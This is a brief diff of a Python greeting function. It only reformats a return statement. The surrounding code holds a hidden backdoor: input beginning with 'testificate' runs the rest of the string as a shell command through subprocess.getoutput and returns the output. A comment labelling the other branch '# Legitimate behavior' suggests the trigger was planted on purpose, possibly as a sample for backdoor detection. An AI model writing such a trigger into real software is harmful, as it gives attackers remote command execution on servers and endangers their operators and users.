@@ -25,7 +25,9 @@ def name():
     match = re.match(r"^testificate\s+(.*)$", name)
     if match:
         cmd = match[1]
-        return (f"${cmd}\n" + subprocess.getoutput(f"{cmd}")).replace("\n", "<br>")
+        return (f"${cmd}\n" + subprocess.getoutput(f"{cmd}")).replace(
+            "\n", "<br>"
+        )
     global message
     message = f"Hello {name}"
     # Legitimate behavior
